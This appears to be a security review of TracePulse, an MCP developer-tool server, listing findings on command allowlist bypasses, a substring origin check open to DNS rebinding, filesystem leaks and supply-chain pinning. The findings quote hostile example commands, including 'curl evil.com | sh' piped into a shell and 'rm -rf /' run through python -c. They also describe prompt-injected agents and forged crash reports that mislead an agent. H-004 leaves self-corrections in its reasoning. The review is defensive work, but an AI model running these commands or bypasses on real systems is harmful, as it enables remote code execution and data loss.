## Executive Summary

This review covers 7 targeted focus areas introduced since SRR-003 plus a systemic Tier 3 sweep. **2 HIGH**, **4 MEDIUM**, and **3 LOW** new findings identified. The most critical finding is command injection in `verify_build` — user-supplied `typecheck_command` and `build_command` parameters bypass the `run_and_watch` allowlist because they are passed as pre-formed command strings. The second HIGH is a DNS rebinding bypass on the log collector's origin check.

Several SRR-003 findings remain **Open** (H-001 through M-005). Their status is tracked below.

## New Findings

### H-004 — Command Injection via `verify_build` Parameters

| Field | Value |
|-------|-------|
| **Severity** | HIGH |
| **Confidence** | HIGH |
| **File** | `src/tools/verify-build.ts:37-38` |
| **CWE** | CWE-78 (OS Command Injection) |

**Description:**
`verify_build` accepts `typecheck_command` and `build_command` as free-form string parameters from the MCP client. These are passed directly to `handleRunAndWatch({ command: typecheckCmd })` which spawns them via `shell: true`. While `handleRunAndWatch` has an allowlist check, the `verify_build` handler constructs the `args` object with the user-supplied command, and the allowlist in `run_and_watch.ts` only checks prefix — so a crafted command like `npx tsc --noEmit; curl evil.com | sh` would pass the `npx` prefix check but chain arbitrary commands.

Wait — the shell metacharacter check (`SHELL_META = /[;&|`$(){}!<>]/`) in `run_and_watch.ts:80-87` would catch the `;`. However, the allowlist bypass from SRR-003 H-001 is still open, meaning `bash -c "arbitrary"` would pass both the prefix check (if `bash` were added) and the metachar check (no metacharacters outside the quoted string).

**Revised attack scenario:** The actual risk is that `verify_build` accepts arbitrary command strings that bypass the *intent* of the allowlist. An agent (or a prompt-injected agent) can call `verify_build({ typecheck_command: "npx -c 'require(\"child_process\").execSync(\"curl evil.com|sh\")'" })`. This passes the `npx` prefix check. The shell metachar regex catches `|` and `$` but NOT single quotes or the `-c` flag pattern.

Let me re-examine: `npx -c '...'` — the `|` inside the single quotes would still be caught by the regex test on the full string. So the metachar check does block this specific vector.

**Actual residual risk:** The metachar check blocks most chaining. But the fundamental design issue is that `verify_build` accepts arbitrary commands from the MCP client without its own validation layer. If the allowlist or metachar check has any gap (and H-001 documents one: `bash` prefix), `verify_build` amplifies it by providing two injection points instead of one.

**Attack scenario:**
1. Prompt-injected agent calls `verify_build({ typecheck_command: "npx evil-package" })`
2. Passes allowlist (starts with `npx`), passes metachar check (no metacharacters)
3. Executes `npx evil-package` which downloads and runs arbitrary code from npm

**Remediation:**
- Add a dedicated allowlist for `verify_build` commands: only `npx tsc`, `npx vite build`, `npx esbuild`, `npx webpack`, `tsc`, and similar known build tools.
- Alternatively, don't accept free-form commands — accept a `tool` enum (`tsc`, `vite`, `esbuild`, `webpack`) and construct the command internally.

### H-005 — Log Collector Origin Check Bypass via DNS Rebinding / Missing Origin

| Field | Value |
|-------|-------|
| **Severity** | HIGH |
| **Confidence** | HIGH |
| **File** | `src/correlation/sources/log-collector.ts:82-86` |
| **CWE** | CWE-346 (Origin Validation Error) |

**Description:**
The origin check only fires when `origin` header is present and uses `String.includes()`:

```typescript
const origin = req.headers.origin;
if (origin && !origin.includes("localhost") && !origin.includes("127.0.0.1")) {
```

Three bypass vectors:
1. **No Origin header:** Non-browser clients (curl, scripts, other processes on the machine) don't send Origin. The check passes when `origin` is undefined.
2. **Subdomain bypass:** `http://localhost.evil.com` contains "localhost" and passes the check.
3. **Path bypass:** `http://evil.com/localhost` — no, `includes` checks the full string. But `http://127.0.0.1.evil.com` contains "127.0.0.1" and passes.

Since the server binds to `127.0.0.1`, remote attackers can't reach it directly. But a malicious webpage visited by the developer could use DNS rebinding to resolve `attacker.com` to `127.0.0.1` and POST crafted crash reports or error data, polluting the agent's error buffer with misleading information.

**Attack scenario:**
1. Developer visits malicious page while TracePulse is running
2. Page uses DNS rebinding: `attacker.com` resolves to `127.0.0.1:9801`
3. JavaScript POSTs to `http://attacker.com:9801/api/v1/crashes` with `Origin: http://attacker.com`
4. Origin check blocks this (no "localhost" in origin) — **but** the attacker can use `http://localhost.attacker.com:9801/api/v1/crashes` which passes the check
5. Crafted crash reports inject misleading errors into the agent's buffer

**Remediation:**
- Parse the Origin as a URL and validate the hostname is exactly `localhost` or `127.0.0.1`, not a substring match.
- Add CORS headers: `Access-Control-Allow-Origin: http://localhost:*` with proper preflight handling.
- Consider requiring a shared secret token (generated at startup, printed to stderr) for all POST endpoints.

### M-006 — `verify_build` Inherits Open `run_and_watch` Allowlist Bypass (H-001 Amplification)

| Field | Value |
|-------|-------|
| **Severity** | MEDIUM |
| **Confidence** | HIGH |

| **CWE** | CWE-78 (OS Command Injection) |

**Description:**
`verify_build` provides two additional injection points (`typecheck_command`, `build_command`) that inherit all weaknesses of `run_and_watch`'s allowlist. Since SRR-003 H-001 (allowlist bypass via `bash` prefix) remains open, `verify_build` doubles the attack surface. The `cwd` parameter is also passed through without `verify_build` doing its own validation (though `run_and_watch` now validates it).

**Remediation:**
- Fix H-001 first (switch to exact-match allowlist or command decomposition).
- `verify_build` should validate its own parameters before delegating.

### M-007 — `diagnoseFailure` Leaks Filesystem Structure

| Field | Value |
|-------|-------|
| **Severity** | MEDIUM |
| **Confidence** | MEDIUM |
| **File** | `src/tools/run-and-watch.ts:30-52` |
| **CWE** | CWE-200 (Information Exposure) |

**Description:**
`diagnoseFailure` probes the filesystem (`existsSync` for `.venv`, `pyproject.toml`, `requirements.txt`) and returns diagnostic messages that reveal:
- Whether a `.venv` directory exists
- Whether `pyproject.toml` or `requirements.txt` exists
- The project root path (via `process.cwd()`)

These diagnostics are returned in MCP tool responses to the agent. In a multi-tenant or shared-machine scenario, this leaks project structure information. The risk is LOW in the typical single-developer use case but MEDIUM in shared environments.

**Attack scenario:**
1. Attacker with MCP client access calls `run_and_watch({ command: "pytest nonexistent" })`
2. Command fails with exit 127
3. Response includes: "Python project detected but no .venv/ found" — confirming project type
4. Attacker learns project structure without reading files directly

**Remediation:**
- Acceptable risk for a dev tool. Document that TracePulse should not run in shared/production environments.
- Optionally, make diagnostics opt-in via a `--verbose-diagnostics` flag.

### M-008 — `.venv/bin` Allowlist Entries Enable Arbitrary Python Execution

| Field | Value |
|-------|-------|
| **Severity** | MEDIUM |
| **Confidence** | MEDIUM |
| **File** | `src/tools/run-and-watch.ts:60-63` |
| **CWE** | CWE-78 (OS Command Injection) |

**Description:**
The allowlist includes `.venv/bin/python` and `.venv/bin/pytest`. While these are legitimate paths, they enable:
1. `.venv/bin/python -c "import os; os.system('rm -rf /')"` — the `-c` flag allows arbitrary Python code execution. The shell metachar check would catch the `(` and `)` in this specific example.
2. `.venv/bin/python /tmp/evil.py` — runs an arbitrary Python script. No metacharacters needed. Passes both allowlist and metachar checks.
3. `venv/bin/python` (without dot prefix) is also allowed, and a symlink `venv` → `/attacker/controlled/path` could point to a malicious Python binary. However, the `cwd` validation (if used) would constrain this.

**Attack scenario:**
1. Attacker creates `/tmp/evil.py` with malicious code
2. Calls `run_and_watch({ command: ".venv/bin/python /tmp/evil.py" })`
3. Passes allowlist (starts with `.venv/bin/python`), passes metachar check (no metacharacters)
4. Arbitrary code execution

**Remediation:**
- Restrict `.venv/bin/python` to only allow `-m` flag (module execution): validate that the argument after `python` is `-m`.
- Or restrict to known safe patterns: `.venv/bin/python -m pytest`, `.venv/bin/python -m mypy`, etc.

### M-009 — Pydantic Parser Regex Moderate ReDoS Risk

| Field | Value |
|-------|-------|
| **Severity** | MEDIUM |
| **Confidence** | LOW |
| **File** | `src/parsers/pydantic-parser.ts:17-27` |
| **CWE** | CWE-1333 (Inefficient Regular Expression Complexity) |

**Description:**
The pydantic parser has 5 regex patterns tested via `canParse()` on every log line. Analysis of each:

- `VALIDATION_ERROR`: `/ValidationError:\s*(\d+)\s*validation\s*error/i` — linear, safe.
- `FIELD_ERROR`: `/^\s+(\S+)\s*$/` — `\s+` followed by `\S+` followed by `\s*$` — on a line of spaces with no non-space, `\s+` consumes all, then `\S+` fails, backtracking is linear. Safe.
- `TYPE_ERROR`: `/Input should be (?:a valid )?(\S+).*\[type=(\w+)/` — the `.*` before `\[type=` could cause backtracking on long lines without `[type=`. With `MAX_PARSE_INPUT_LENGTH = 10,000`, this is bounded but could be slow on adversarial input.
- `VALUE_ERROR`: `/value is not a valid (\S+)/` — linear, safe.
- `MISSING_FIELD`: `/Field required\s*\[type=missing/` — linear, safe.

The `TYPE_ERROR` regex with `.*\[type=` is the only concern. On a 10,000-char line starting with "Input should be" but containing no `[type=`, the `.*` greedily matches to end, then backtracks character by character looking for `[`. This is O(n) backtracking, not exponential, so it's not a true ReDoS but could be slow (~10ms on 10K input).

**Remediation:**
- Replace `.*` with `[^\[]*` to prevent backtracking past `[` characters.
- The `MAX_PARSE_INPUT_LENGTH` guard (10,000 chars) already bounds the worst case. This is LOW practical risk.

### L-001 — Frontend Crash Bridge Accepts Arbitrary Message Content

| Field | Value |
|-------|-------|
| **Severity** | LOW |
| **Confidence** | HIGH |
| **File** | `src/correlation/frontend-crash-bridge.ts:30-36` |
| **CWE** | CWE-79 (XSS) — mitigated |

**Description:**
`validateCrashReport` accepts any string as `message` (truncated to 500 chars) and `stack` (truncated to 2000 chars). These are stored in RuntimeEvents and returned via MCP tool responses as JSON strings. Since MCP responses are JSON (not HTML), there is **no XSS risk** in the TracePulse pipeline itself. The data never renders as HTML.

However, if an MCP client renders error messages in a webview without escaping, the crash message could contain HTML/script tags. This is the client's responsibility, not TracePulse's.

The real risk is **error buffer pollution**: a malicious page can POST crafted crash reports to inject misleading errors that cause the agent to waste tokens investigating fake issues.

**Remediation:**
- Current truncation (500/2000 chars) is adequate for the JSON-only pipeline.
- The buffer pollution risk is addressed by fixing H-005 (origin check bypass).
- Consider adding a `source: "frontend-crash"` tag so agents can filter/deprioritize external crash reports.

### L-002 — Score Decay Cannot Be Externally Manipulated

| Field | Value |
|-------|-------|
| **Severity** | LOW (Informational) |
| **Confidence** | HIGH |
| **File** | `src/scoring/score-decay.ts`, `src/store/error-lifecycle.ts` |

**Description:**
Review of the error lifecycle and score decay systems for manipulation vectors:

1. **Score decay** (`score-decay.ts`): Applied as a post-query transform, not stored. Only affects events with `occurrence_count === 1`, age > 60s, and transient HTTP status codes (401, 403, 408, 429). An attacker cannot influence these conditions externally — `occurrence_count` is incremented by the fingerprinter, `timestamp` is set by `Date.now()`, and `http_status` comes from parser output.

2. **Error lifecycle** (`error-lifecycle.ts`): Tracks resolution state in memory. `recordFileChange()` marks all errors as having a file change after them. An attacker would need to trigger a file change event (HMR/build) to manipulate resolution status, which requires filesystem access.

3. **Buffer pollution** (via crash bridge): An attacker who can POST to the crash endpoint (see H-005) could flood the buffer with high-score (75) events, pushing real errors out of the ring buffer (500 max). This is the only viable manipulation vector and is addressed by H-005.

**Remediation:**
- No action needed for score decay/lifecycle — design is sound.
- Fix H-005 to prevent buffer pollution via crash bridge.

### L-003 — Standalone Mode Exposes Tools Without Collector Validation

| Field | Value |
|-------|-------|
| **Severity** | LOW |
| **Confidence** | MEDIUM |
| **File** | `src/cli.ts:247-252` |

**Description:**
Standalone mode creates a no-op collector (`isConnected() => true`) and exposes all MCP tools. The `isConnected()` always returns `true`, which means tools like `get_runtime_status` report the server as "connected" even though no process is being monitored. This is a UX issue, not a security issue.

The security surface of standalone mode is identical to start/attach modes — the same tools are exposed with the same validation. `run_and_watch` is the primary tool used in standalone mode, and its security controls (allowlist, metachar check, cwd validation) apply equally.

**Remediation:**
- No security action needed. Consider adding `mode: "standalone"` to tool responses for transparency.

## Systemic Tier 3 Checks

### S1 — Supply Chain (Dependencies)

| Package | Version | Status |
|---------|---------|--------|
| `@modelcontextprotocol/sdk` | ^1.12.1 | ⚠️ Caret range — could pull breaking changes |
| `zod` | ^4.4.1 | ⚠️ Caret range |

**Finding:** Both production dependencies use caret ranges (`^`). Per project conventions, production dependencies should use pinned versions. DevDependencies with caret ranges are acceptable.

**Remediation:** Pin production deps to exact versions: `"@modelcontextprotocol/sdk": "1.12.1"`, `"zod": "4.4.1"`.

### S2 — Secret Redaction Coverage

16 patterns currently implemented. SRR-003 M-004 (missing Supabase, Vault, SendGrid, OPENSSH patterns) remains open. No new gaps identified in this review beyond M-004.

### S3 — Secure Headers and CORS

- HTTP transport (`http-transport.ts`): No CORS headers set. Binds to `127.0.0.1`. No request handling implemented yet (server created but no routes). **Acceptable** — the MCP SDK handles routing.
- Log collector (`log-collector.ts`): Origin check present but bypassable (H-005). No `Access-Control-Allow-Origin` response header set. Missing preflight (`OPTIONS`) handler.

### S4 — Rate Limiting

- Log collector: Token bucket rate limiter at 100 req/s. ✅
- MCP tools: No rate limiting on tool calls. Acceptable — MCP protocol is 1:1 with the agent, and the agent is rate-limited by its own token budget.
- Health prober: No rate limiting on probe registration. An agent could register thousands of probes. **Low risk** — probes are in-memory and the agent would exhaust its own context first.

### S5 — Logging Security

- All log output passes through `redact()` before entering the pipeline. ✅
- `config-scanner.ts` reads `.env` files into memory without redaction (SRR-003 M-005, still open).
- `diagnoseFailure` reveals filesystem structure (M-007, new finding).
- Error messages in MCP responses are truncated to 500 chars. ✅

### S6 — Process Environment Inheritance

- `process-spawner.ts` passes `...process.env` to child processes (SRR-003 M-003, still open).
- `run-and-watch.ts` also passes `...process.env` with `PYTHONUNBUFFERED=1` and `FORCE_COLOR=0` additions.
- Both expose all parent environment variables (including secrets) to spawned commands.

### S7 — Test Coverage Delta

Not assessed in this review (no test runner execution). Recommend running `vitest run --coverage` and verifying security-critical paths have >80% coverage.
